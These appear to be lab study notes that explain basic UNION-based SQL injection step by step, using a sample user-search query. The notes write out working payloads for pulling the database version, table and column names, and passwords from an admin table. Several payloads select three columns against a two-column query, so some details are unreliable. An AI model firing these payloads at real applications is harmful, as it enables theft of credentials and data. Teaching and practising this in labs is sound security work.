
# 🧐 SQL Injection Lab [0x01] - Basic SQL Injection Attacks

---

## 🧐 Understanding SQL Injection

### 🔍 Basic SQL Injection

When you search for `jeremy`, the back-end SQL query might look like this:

```sql
SELECT username, email FROM users WHERE username = 'jeremy'
```

---

## 🤯 Injecting SQL

### 1. Why the Single Quote (`'`)?

The single quote (`'`) is used to terminate the string `'jeremy'` in the SQL query. This allows the injection of additional SQL commands.  
Example:
```sql
... WHERE username = 'jeremy' -- Here we end the input
```

---

### 2. Use of `UNION SELECT`

`UNION` combines results of two or more `SELECT` queries. After closing the initial query with a single quote, `UNION` allows you to add another `SELECT` query to fetch different data.

Example:
```sql
... ' UNION SELECT 1, 2, 3 -- Adding a new SELECT query
```

The `null` values are placeholders. If the original query expects two columns, you must match that format:
```sql
UNION SELECT null, null, version()
```

---

### 3. Why `version()`?

The `version()` function in SQL returns the current database version. This helps gather information about the database for further attacks or analysis.

---

### 4. Role of `#`

The `#` character is a comment indicator in SQL. Everything after `#` is ignored by the SQL parser, neutralizing the rest of the original query and ensuring only the injected SQL executes.

Example:
```sql
... version()# -- Rest of the original SQL is ignored
```

---

## 📋 Example in Action

Injection:
```sql
jeremy' UNION SELECT null, null, version()#
```

Resulting Query:
```sql
SELECT username, email FROM users WHERE username = 'jeremy' UNION SELECT null, null, version()#'
```

---

## 🧐 Detailed Breakdown of SQL Injection Handling

### How SQL Injection Manipulates the Query

1. **Original Query Setup**:
    ```sql
    SELECT username, email FROM users WHERE username = 'INPUT'
    ```

2. **Attacker's Input**:
    - Input:
      ```
      Jeremy' UNION SELECT username, password FROM admin_users --
      ```
    - The input includes a single quote (`'`) to prematurely close the string and append malicious SQL commands.

3. **Query After Injection**:
    ```sql
    SELECT username, email FROM users WHERE username = 'Jeremy' UNION SELECT username, password FROM admin_users -- '
    ```

4. **Effect of the Injection**:
    - **String Closure:** The first single quote in `Jeremy'` closes the string opened by `'INPUT'`.
    - **Command Insertion:** The `UNION SELECT` command is added, fetching unauthorized data.
    - **Commenting Out:** The `--` ensures the rest of the query is ignored.

5. **Execution of the Modified Query**:
    - **Active Part:** The SQL engine executes the query up to the comment marker (`--`).
    - **Ignored Part:** Everything after `--` is disregarded, including any extraneous quotes.

---

## 💡 Key Takeaways

- SQL Injection manipulates SQL queries to access or manipulate unauthorized data.
- Techniques like `UNION SELECT`, `version()`, and `#` comments play critical roles in successful SQL Injection attacks.
- Understanding these attack vectors is essential to building secure systems.

---

### 📋 Summary of Example Injection Steps:

1. Extract database version:
    ```sql
    jeremy' UNION SELECT null, null, version()#
    ```

2. Extract table names:
    ```sql
    jeremy' UNION SELECT null, null, table_name FROM information_schema.tables#
    ```

3. Extract column names:
    ```sql
    jeremy' UNION SELECT null, null, column_name FROM information_schema.columns#
    ```

4. Extract sensitive data:
    ```sql
    jeremy' UNION SELECT null, null, password FROM admin_users#
    ```

---

This lab demonstrates the severity of SQL Injection vulnerabilities and emphasizes the importance of sanitizing user input and using parameterized queries.
